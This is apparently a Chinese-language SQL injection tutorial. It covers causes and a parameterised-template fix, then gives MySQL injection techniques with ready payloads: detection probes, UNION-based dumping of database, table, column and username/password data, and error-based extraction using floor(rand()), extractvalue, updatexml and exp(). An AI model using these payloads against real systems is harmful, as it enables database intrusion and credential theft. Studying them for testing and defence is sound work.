## SQL注入漏洞
#### 背景
* * *
随着互联网web和信息技术的发展，在web后端作为存储和管理的的数据库也得到了广泛的应用，与web结合较为紧密的数据库包括Mysql，Sqlserver，Oracle，Sqllite，Db2，Access等等。
数据存储和管理作为应用的一个基本需求，在绝大多数的应用里都得到了使用，这种大面积的使用也意味着在数据库操作方面如果处理不当出现问题的可能性会很大，另外一方面由于数据库承载了应用的数据信息，如果数据库出现问题一方面可能导致敏感数据的泄露和篡改（如信用卡账户，用户密码，管理账户和密码，销售记录等等），直接导致损失和应用被攻陷，另外一方面，即使数据库中不承载较为敏感的信息，由于数据库的特殊性，数据库被攻击的话也可以直接导致应用程序崩溃及其他严重的后果。
#### 漏洞成因
应用为了和数据库进行沟通完成必要的 **管理和存储工作** ，必须和数据库保留一种 **接口**
。目前的数据库一般都是提供api以支持管理，应用使用底层开发语言如Php，Java，asp，Python与这些api进行通讯。对于数据库的操作，目前普遍使用一种SQL语言（Structured
Query
Language语言，SQL语言的功能包括增删查改等，是一个综合的、通用的关系数据库语言，同时又是一种高度非过程化的语言，只要求用户指出做什么而不需要指出怎么做），SQL作为字符串通过API传入给数据库，数据库将查询的结果返回，数据库自身是无法分辨传入的SQL是合法的还是不合法的，它完全信任传入的数据，
**如果传入的SQL语句被恶意用户控制或者篡改，将导致数据库以当前调用者的身份执行预期之外的命令并且返回结果，导致安全问题。**
那么恶意用户如何才能控制传入的SQL语句呢？我们知道，既然传入的SQL是以字符串的方式传入的，这个字符串由应用生成，那么如果应用生成这个字符串的方式不对就可能导致问题，譬如考虑如下的功能：
    $sql="select * from members where userid=".$_GET[userid];
    $sb->query($sql);
这段代码的逻辑是根据用户请求的Userid进入数据库查询出不同的用户并且返回给用户，可以看到最终传入的字符串有一部分是根据用户的输入来控制的，一旦用户提交`poc.php?userid=1
or 1=1`最终进入程序之后传入数据库的逻辑将是
    $sb->query("select * from members where userid=1 or 1=1");
用户完全可以根据传入的内容来控制整个SQL的逻辑，实现间接控制和管理数据库的目的，
**这种命令（SQL语句）和数据（用户提交的查询）不分开的实现方式导致了安全漏洞的产生。**
由于不同的开发语言可能对api进行了不同的封装，并且各种语言内部对数据的校验会有不同的要求，譬如java和python属于变量强类型并且各种开发框架的流行导致出现SQL注射的几率较小，php属于弱类型不会对数据进行强制的验证加上过程化的程序编写思路导致出现注射的几率会较大。
#### 攻击方式
通过典型的SQL注射漏洞，黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的 **数据库特性上和细节上** 。同时，
**后端的数据库的不同导致黑客能利用SQL语句进行的操作也并不相同** ，因为很多的数据库在标准的SQL之外也会实现一些自身比较 **特别的功能和扩展**
，常见的有 **Sqlserver的多语句查询** ， **Mysql的高权限可以读写系统文件** ， **Oracle经常出现的一些系统包提权漏洞** 。
即使一些SQL注射本身无法对数据本身进行一些高级别的危害，譬如一些数据库里可能没有存储私密信息，利用SQL查询的结果一样可能 **对应用**
造成巨大的灾难，因为应用可能将从数据库里提取的信息做一些其他的比较高危险的动作，譬如进行文件读写，这种本身无价值的数据和查询一旦被应用本身赋予较高的意义的话，可能一样导致很高的危害。
评估一个SQL注射的危害需要取决于注射点发生的SQL语句的上下文，SQL语句在应用的上下文，应用在数据库的上下文，综合考虑这些因素来评估一个SQL注射的影响，在无上述利用结果的情况下，通过web应用向数据库传递一些资源要求极高的查询将导致数据库的拒绝服务，这将是黑客可能能进行的最后的利用。
#### 修复方案
比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。
事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于 **对数据和指令的不分离**
，所以在修复的时候应该 **极力将数据和指令分离** 。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是
**以填充模板的方式来代替传统的拼接的方式进行数据库查询** ， **譬如：**
    $SqlTemplate="select * from members where userid={userid|int}";
    $sb->PreSql($SqlTemplate,$_GET['userid']);
模板里有关数据及数据自身意义的描述， **PreSql方法** 将实现 **将模板和数据安全的转换为SQL语句的功能** ，以保障最终的安全的实现。
# 姿势总结
## 前置知识
[SQL语法](https://www.w3school.com.cn/sql/sql_syntax.asp)
具体不同的数据库还会有自己特有的一些语法结构或者函数等，这些都有可能成为我们注入的工具，但是我们很难成为开拓的人，我们只能去把它们积累起来，为我们以后的攻防作积累。
### 比较重要的基础
##### 基础的增删查改语句
[SQL语法](https://www.w3school.com.cn/sql/sql_syntax.asp) 去学！
#### 注释
我们篡改SQL语句很多时候都会使用到注释，SQL语法中的注释符有以下几种：
    #
    --+(这里的+其实是空格的意思，因为我们的注入时+通常会被识别为空格，这是早期养成的习惯，但是后来在看一些大牛的文章的时候会发现他们更爱用-- -这种形式，很多工具等等也是)
    /**/(这个也不太常用)
##### 包含信息的内置表
    information_schema.tables
    information_schema.columns
## mysql注入
### mysql数据库
MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种 **关联数据库管理系统**
，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。
  * MySQL是 **开源** 的，所以你不需要支付额外的费用。
  * MySQL使用 **标准的 SQL 数据语言** 形式。
  * MySQL可以运行于多个系统上，并且 **支持多种语言** 。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。
  * MySQL **对PHP有很好的支持** ，PHP 是目前最流行的 Web 开发语言。
  * MySQL **支持大型数据库** ，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。
  * MySQL是 **可以定制的** ，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。
引自：[Mysql教程 | 菜鸟教程](https://www.runoob.com/mysql/mysql-tutorial.html)
一个完整的mysql管理系统结构通常如下图：
可以看到，mysql可以管理 **多个数据库** ，一个数据库可以包含 **多个数据表** ，而一个数据表有含有 **多条字段** ，一行数据正是
**多个字段同一行** 的一串数据。
Mysql具有很独特的特点而且使用最为广泛，Mysql数据库本身的权限极高，作为应用可以对本机进行文件读写，可以进行提权等。
### 常见注入姿势
因为知识琐碎，一些前置知识不能很好的列再前面，对几种常见的注入方式进行了总结、梳理，基本上也涵盖了大部分的需要的前置知识，在很多地方也阐述了一些个人的理解，但是可能还是比较凌乱，也没有很好的办法去解决。
#### 联合查询
很多时候联合查询也会和其他的几种查询方式一起使用。
##### 联合查询用到的SQL语法知识
`UNION`可以将前后两个查询语句的结果拼接到一起，但是会自动去重。
`UNION ALL`功能相同，但是会显示所有数据，不会去重。
具有类似功能的还有`JOIN` 
但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。
##### 注入流程
  1. 判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式
        ?id=1' 
    ?id=1" 
    ?id=1') 
    ?id=1") 
    ?id=1' or 1#
    ?id=1' or 0#
    ?id=1' or 1=1#
    ?id=1' and 1=2#
    ?id=1' and sleep(5)#
    ?id=1' and 1=2 or ' 
    ?id=1\
  2. 猜测SQL查询语句中的字段数
    * 使用 order/group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。
        1' order by 1#
    1' order by 2#
    1' order by 3#
    1 order by 1
    1 order by 2
    1 order by 3
    * 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。
        1' union select 1#
    1' union select 1,2#
    1' union select 1,2,3#
    1 union select 1#
    1 union select 1,2#
    1 union select 1,2,3#
  3. 确定显示数据的字段位置  
使用 union select 1,2,3,4,... 根据回显的字段数，判断回显数据的字段位置。
        -1' union select 1#
    -1' union select 1,2#
    -1' union select 1,2,3#
    -1 union select 1#
    -1 union select 1,2#
    -1 union select 1,2,3#
注意：
    * 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。
    * ⼀定要拼接够足够的字段数，否则SQL语句报错。
  4. 在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：
    * 获取当前数据库名
        -1' union select 1,2,database()--+
    * 获取当前数据库的表名
        -1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
    -1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+
    * 获取表中的字段名
        -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
    -1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--+
    * 获取数据
        -1' union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+
    -1' union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+
一般情况下就是这样的一个顺序，`确定联合查询的字段数->确定联合查询回显位置->爆库->爆表->爆字段->爆数据`。
我们可以看到这里使用了group_concat来拼接查询多个数据，在很多种查询中都有使用这个函数来提高效率，同时还可以拼接十六进制特殊字符来分隔，同时还使用了information_shcema表获取表信息、字段信息，这个表在低版本mysql中不存在，同时有时还会被过滤，这也会是我们绕过的一个方向。
#### 报错注入
##### 报错注入用到的SQL语法知识
大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行， **报错的过程可能会出现在查询或者插入甚至删除的过程** 中。
###### 0x00 floor()（8.x>mysql>5.0）[双查询报错注入]
函数返回小于或等于指定值（value）的最小整数,取整
> 通过floor报错的方法来爆数据的 **本质是group by语句的报错** 。group
> by语句报错的原因是`floor(random(0)*2)`的不确定性，即可能为0也可能为1
>
> group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，
> **如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。**
>
> group by
> `floor(random(0)*2)`出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下`floor(random(0)*2)`可能为0，如果此时临时表
> **只有key为1的行不存在key为0的行** ，那么数据库要将该条记录 **插入**
> 临时表，由于是随机数，插时又要计算一下随机值，此时`floor(random(0)*2)`结果可能为1，就会导致插入时 **冲突而报错**
> 。即检测时和插入时两次计算了随机数的值。  
>
    ?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
    /*拆解出来就是下面的语句*/
    concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x
**可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group
by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错**
**双查询报错注入** 的原理
，
大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个`Floor()`就是这种情况。
###### 0x01 extractvalue()
对XML文档进行查询的函数
第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用
/xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。
    and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))
###### 0x02 UPDATEXML (XML_document, XPath_string, new_value);
  * 第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc
  * 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
  * 第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值
由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。
这也是一种非常常见的报错注入的函数。
    ' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
###### 0x03 exp(x)
返回 e 的 x 次方,当 数据过大 溢出时报错，即 x > 709
    mail=') or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))) as asd))--+